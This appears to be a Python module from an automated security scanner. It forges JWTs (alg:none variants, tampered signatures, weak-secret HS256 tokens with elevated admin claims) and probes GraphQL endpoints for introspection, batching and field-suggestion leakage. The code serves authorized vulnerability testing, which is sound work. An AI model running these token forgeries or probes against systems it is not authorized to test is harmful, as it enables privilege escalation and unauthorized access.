"""
API/auth probes — JWT verification attacks and GraphQL deep testing.

Two bug classes serious tools test that scanners+prompts alone handle poorly:

  * **JWT** — servers that don't properly verify tokens: ``alg:none`` acceptance,
    unverified/tampered signatures, and HS256 signing keys weak enough to forge.
    Detection is differential against an authorized baseline: if a forged/broken
    token is still accepted on a protected endpoint, verification is broken.
  * **GraphQL** — introspection left enabled (full schema disclosure), query
    batching/aliasing accepted (enables brute force / DoS), and field-suggestion
    leakage ("Did you mean …").

Dependency-free (base64/hmac/hashlib only) and injectable-HTTP so the crafting
and verdict logic are unit-tested without a network.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("agent.api_probes")

HttpFetch = Callable[[str, str, Dict[str, str], str], Dict[str, Any]]


def _default_http(method: str, url: str, headers: Dict[str, str], body: str) -> Dict[str, Any]:
    import scanners
    return scanners.run_send_http_request(
        method=method, url=url, headers_json=json.dumps(headers or {}),
        body=body, follow_redirects=False, bridge=None,
    )


# ---------------------------------------------------------------------------
# JWT helpers (no external dependency)
# ---------------------------------------------------------------------------

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _split_jwt(token: str) -> Optional[tuple]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    return header, payload, parts


def _encode_jwt(header: dict, payload: dict, signature: str = "") -> str:
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def _hs256_sign(header: dict, payload: dict, secret: str) -> str:
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url(sig)}"


_WEAK_SECRETS = ["secret", "password", "123456", "changeme", "jwt", "key",
                 "admin", "your-256-bit-secret", "supersecret", "s3cr3t"]


def jwt_attack_tokens(token: str) -> List[Dict[str, str]]:
    """Craft attack tokens from a valid JWT. Pure — unit-tested."""
    parsed = _split_jwt(token)
    if not parsed:
        return []
    header, payload, parts = parsed
    out: List[Dict[str, str]] = []

    # 1. alg:none family (empty signature)
    for none_alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header, alg=none_alg)
        out.append({"attack": f"alg={none_alg}", "token": _encode_jwt(h, payload, "")})

    # 2. tampered signature (payload elevated, original alg, garbage sig)
    elevated = dict(payload, aegjwt=1)
    for role_key in ("role", "admin", "isAdmin", "is_admin"):
        if role_key in payload:
            elevated[role_key] = True if "admin" in role_key.lower() else "admin"
    out.append({"attack": "tampered-signature",
                "token": f"{parts[0]}.{_b64url(json.dumps(elevated, separators=(',',':')).encode())}.{parts[2]}"})

    # 3. weak HS256 secret forgery (elevated payload)
    hs_header = dict(header, alg="HS256")
    for secret in _WEAK_SECRETS:
        out.append({"attack": f"weak-secret:{secret}",
                    "token": _hs256_sign(hs_header, elevated, secret)})
    return out


def _jwt_accepted(baseline: Dict[str, Any], variant: Dict[str, Any]) -> bool:
    """A forged token is 'accepted' if the protected endpoint still authorizes it."""
    if baseline.get("status") != 200:
        return False
    return variant.get("status") == 200 and variant.get("status") not in (401, 403)


def run_probe_jwt(target_url: str, token: str, header_name: str = "Authorization",
                  scheme: str = "Bearer", fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    """Test whether a protected endpoint properly verifies its JWT.

    Args:
        target_url: a protected endpoint the token authorizes.
        token: a currently-valid JWT.
        header_name: header carrying the token (default Authorization).
        scheme: token scheme prefix (default "Bearer"; "" for raw).
    """
    http = fetch or _default_http
    if not _split_jwt(token):
        return {"probe": "jwt", "target": target_url, "candidates": [],
                "error": "token is not a decodable JWT"}

    def _send(tok: str) -> Dict[str, Any]:
        val = f"{scheme} {tok}".strip() if scheme else tok
        return http("GET", target_url, {header_name: val}, "")

    baseline = _send(token)
    if baseline.get("status") != 200:
        return {"probe": "jwt", "target": target_url, "candidates": [],
                "note": f"baseline with the valid token was not 200 "
                        f"(HTTP {baseline.get('status')}); pick an endpoint the token authorizes"}

    candidates: List[Dict[str, Any]] = []
    for variant in jwt_attack_tokens(token):
        resp = _send(variant["token"])
        if _jwt_accepted(baseline, resp):
            candidates.append({
                "title": f"JWT verification bypass ({variant['attack']})",
                "vuln_type": "jwt", "severity": "high", "url": target_url,
                "payload": variant["attack"],
                "evidence": f"forged token ({variant['attack']}) accepted with HTTP 200",
                "confirmed": True,
            })
            if variant["attack"].startswith(("alg=", "tampered", "weak-secret")):
                break  # one clear break is enough proof
    return {"probe": "jwt", "target": target_url, "candidates": candidates}


# ---------------------------------------------------------------------------
# GraphQL deep testing
# ---------------------------------------------------------------------------

_INTROSPECTION_QUERY = '{"query":"query{__schema{types{name}}}"}'


def _introspection_enabled(resp_body: str) -> bool:
    try:
        data = json.loads(resp_body)
    except Exception:
        return False
    return bool(data.get("data", {}).get("__schema", {}).get("types"))


def _suggestions_leak(resp_body: str) -> bool:
    return "did you mean" in (resp_body or "").lower()


def _batching_enabled(resp_body: str) -> bool:
    try:
        data = json.loads(resp_body)
    except Exception:
        return False
    # A batched request returns a JSON array of results.
    return isinstance(data, list) and len(data) >= 2


def run_probe_graphql(endpoint_url: str, fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    """Probe a GraphQL endpoint for introspection, batching, and field-suggestion leakage."""
    http = fetch or _default_http
    hdrs = {"Content-Type": "application/json"}
    candidates: List[Dict[str, Any]] = []

    intro = http("POST", endpoint_url, hdrs, _INTROSPECTION_QUERY)
    if _introspection_enabled(intro.get("body") or ""):
        candidates.append({
            "title": "GraphQL introspection enabled",
            "vuln_type": "graphql_introspection", "severity": "medium", "url": endpoint_url,
            "evidence": "__schema types returned — full schema disclosed", "confirmed": True,
        })

    batch = http("POST", endpoint_url, hdrs,
                 '[{"query":"{__typename}"},{"query":"{__typename}"}]')
    if _batching_enabled(batch.get("body") or ""):
        candidates.append({
            "title": "GraphQL query batching accepted",
            "vuln_type": "graphql_batching", "severity": "low", "url": endpoint_url,
            "evidence": "array of queries executed — enables brute force / DoS amplification",
            "confirmed": True,
        })

    typo = http("POST", endpoint_url, hdrs, '{"query":"{ userr { id } }"}')
    if _suggestions_leak(typo.get("body") or ""):
        candidates.append({
            "title": "GraphQL field-suggestion leakage",
            "vuln_type": "graphql_suggestions", "severity": "low", "url": endpoint_url,
            "evidence": "'Did you mean' suggestions leak schema field names", "confirmed": True,
        })
    return {"probe": "graphql", "target": endpoint_url, "candidates": candidates}


__all__ = [
    "run_probe_jwt", "jwt_attack_tokens", "_jwt_accepted",
    "run_probe_graphql", "_introspection_enabled", "_batching_enabled", "_suggestions_leak",
]
